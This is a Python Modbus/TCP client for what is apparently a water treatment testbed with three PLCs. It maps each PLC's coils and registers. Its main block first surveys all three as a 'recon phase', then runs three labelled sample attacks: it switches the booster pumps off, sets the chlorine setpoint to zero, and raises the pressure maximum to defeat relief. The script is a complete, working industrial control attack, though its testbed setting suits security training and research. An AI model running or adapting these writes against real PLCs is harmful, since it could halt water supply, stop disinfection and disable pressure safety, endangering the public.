"""
Modbus/TCP client for the multi-PLC water treatment testbed.

All sensor inputs and setpoints live in holding registers (FC 3/6).
This is because OpenPLC's input registers (%IW) are read-only by the
Modbus spec, so the simulator could not inject sensor readings.

Address map per PLC:

PLC1 - Intake:
  Coils (FC 1/5):  0=IntakePump, 1=IntakeValve, 2=LowSourceAlarm, 3=HighFlowAlarm
  Holding (FC 3/6):
     0  PumpRuntime         (counter)
     1  PumpHysteresis      (state)
     2  TotalIntake         (counter)
    10  SourceLevel         (sensor, simulator-driven)
    11  IntakeFlow          (sensor)
    12  EmergencyStop       (0/1)

PLC2 - Treatment:
  Coils: 0=ChlorineDoser, 1=AcidDoser, 2=BaseDoser, 3=Mixer,
         4=ContaminationAlarm, 5=PhAlarm
  Holding:
     0  ChlorineSetpoint
     1  PhSetpointLow
     2  PhSetpointHigh
     3  DosingCycles
    10  TreatmentTankLevel  (sensor)
    11  ChlorineLevel       (sensor)
    12  PhLevel             (sensor, scaled x10)

PLC3 - Distribution:
  Coils: 0=BoosterPump1, 1=BoosterPump2, 2=PressureReliefValve,
         3=SupplyValve, 4=OverpressureAlarm, 5=LowPressureAlarm
  Holding:
     0  PressureSetpoint
     1  PressureMax
     2  DailyOutflow
     3  PumpStaging
    10  DistributionPressure (sensor)
    11  OutflowRate          (sensor)
    12  ReservoirLevel       (sensor)
"""

from __future__ import annotations

import logging
from dataclasses import dataclass, field
from typing import Optional

from pymodbus.client import ModbusTcpClient
from pymodbus.exceptions import ModbusException

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
log = logging.getLogger("modbus_client")


@dataclass(frozen=True)
class PlcTarget:
    host: str
    name: str
    role: str
    coils: dict[int, str] = field(default_factory=dict)
    holding_registers: dict[int, str] = field(default_factory=dict)


PLCS: dict[str, PlcTarget] = {
    "intake": PlcTarget(
        host="plc1-intake",
        name="PLC1 - Intake Station",
        role="Water source intake control",
        coils={
            0: "IntakePump",
            1: "IntakeValve",
            2: "LowSourceAlarm",
            3: "HighFlowAlarm",
        },
        holding_registers={
            0: "PumpRuntime",
            1: "PumpHysteresis",
            2: "TotalIntake",
            10: "SourceLevel",
            11: "IntakeFlow",
            12: "EmergencyStop",
        },
    ),
    "treatment": PlcTarget(
        host="plc2-treatment",
        name="PLC2 - Treatment Station",
        role="Chlorine dosing and pH balancing",
        coils={
            0: "ChlorineDoser",
            1: "AcidDoser",
            2: "BaseDoser",
            3: "Mixer",
            4: "ContaminationAlarm",
            5: "PhAlarm",
        },
        holding_registers={
            0: "ChlorineSetpoint",
            1: "PhSetpointLow",
            2: "PhSetpointHigh",
            3: "DosingCycles",
            10: "TreatmentTankLevel",
            11: "ChlorineLevel",
            12: "PhLevel",
        },
    ),
    "distribution": PlcTarget(
        host="plc3-distribution",
        name="PLC3 - Distribution Station",
        role="Pressure regulation and customer supply",
        coils={
            0: "BoosterPump1",
            1: "BoosterPump2",
            2: "PressureReliefValve",
            3: "SupplyValve",
            4: "OverpressureAlarm",
            5: "LowPressureAlarm",
        },
        holding_registers={
            0: "PressureSetpoint",
            1: "PressureMax",
            2: "DailyOutflow",
            3: "PumpStaging",
            10: "DistributionPressure",
            11: "OutflowRate",
            12: "ReservoirLevel",
        },
    ),
}


class ModbusConnector:
    def __init__(self, target: PlcTarget, port: int = 502, unit_id: int = 1, timeout: float = 3.0) -> None:
        self.target = target
        self.host = target.host
        self.port = port
        self.unit_id = unit_id
        self.timeout = timeout
        self._client: Optional[ModbusTcpClient] = None

    def connect(self) -> bool:
        self._client = ModbusTcpClient(host=self.host, port=self.port, timeout=self.timeout)
        ok = self._client.connect()
        log.info(f"[{self.target.name}] connect -> {ok}")
        return ok

    def close(self) -> None:
        if self._client:
            self._client.close()

    def __enter__(self) -> "ModbusConnector":
        if not self.connect():
            raise ConnectionError(f"Could not connect to {self.host}:{self.port}")
        return self

    def __exit__(self, *exc) -> None:
        self.close()

    def read_holding_register(self, address: int) -> int:
        rr = self._client.read_holding_registers(address=address, count=1, slave=self.unit_id)
        if rr.isError():
            raise ModbusException(f"read_holding_register({address}) failed: {rr}")
        return rr.registers[0]

    def read_coil(self, address: int) -> bool:
        rr = self._client.read_coils(address=address, count=1, slave=self.unit_id)
        if rr.isError():
            raise ModbusException(f"read_coil({address}) failed: {rr}")
        return bool(rr.bits[0])

    def write_coil(self, address: int, value: bool) -> None:
        rr = self._client.write_coil(address=address, value=value, slave=self.unit_id)
        if rr.isError():
            raise ModbusException(f"write_coil({address}, {value}) failed: {rr}")
        log.info(f"[{self.target.name}] WROTE coil[{address}] = {value}")

    def write_register(self, address: int, value: int) -> None:
        rr = self._client.write_register(address=address, value=value, slave=self.unit_id)
        if rr.isError():
            raise ModbusException(f"write_register({address}, {value}) failed: {rr}")
        log.info(f"[{self.target.name}] WROTE holding_register[{address}] = {value}")

    def read_full_state(self) -> dict[str, int | bool]:
        state: dict[str, int | bool] = {}
        for addr, name in self.target.coils.items():
            state[name] = self.read_coil(addr)
        for addr, name in self.target.holding_registers.items():
            state[name] = self.read_holding_register(addr)
        return state


def survey_all_plcs() -> dict[str, dict[str, int | bool]]:
    results: dict[str, dict[str, int | bool]] = {}
    for key, target in PLCS.items():
        try:
            with ModbusConnector(target) as c:
                results[key] = c.read_full_state()
        except Exception as e:
            log.error(f"[{target.name}] survey failed: {e}")
            results[key] = {}
    return results


def print_state(name: str, state: dict[str, int | bool]) -> None:
    print(f"  {name}:")
    if not state:
        print("    [unreachable]")
        return
    for key, value in state.items():
        v = ("ON " if value else "OFF") if isinstance(value, bool) else str(value)
        print(f"    {key:<25} = {v}")


if __name__ == "__main__":
    print("=" * 70)
    print("Multi-PLC water treatment plant survey")
    print("=" * 70)

    print("\n[1] Surveying all PLCs (recon phase):")
    survey = survey_all_plcs()
    for key, state in survey.items():
        print_state(PLCS[key].name, state)

    print("\n[2] Sample attack: force PLC3 booster pumps OFF (denial of service):")
    try:
        with ModbusConnector(PLCS["distribution"]) as c:
            c.write_coil(0, False)
            c.write_coil(1, False)
            print_state(PLCS["distribution"].name, c.read_full_state())
    except Exception as e:
        log.error(f"Attack failed: {e}")

    print("\n[3] Sample attack: tamper with PLC2 chlorine setpoint:")
    try:
        with ModbusConnector(PLCS["treatment"]) as c:
            c.write_register(0, 0)
            print_state(PLCS["treatment"].name, c.read_full_state())
    except Exception as e:
        log.error(f"Attack failed: {e}")

    print("\n[4] Sample attack: raise PLC3 PressureMax to disable safety relief:")
    try:
        with ModbusConnector(PLCS["distribution"]) as c:
            c.write_register(1, 9999)
            print_state(PLCS["distribution"].name, c.read_full_state())
    except Exception as e:
        log.error(f"Attack failed: {e}")

    print("\n" + "=" * 70)
    print("Survey complete.")
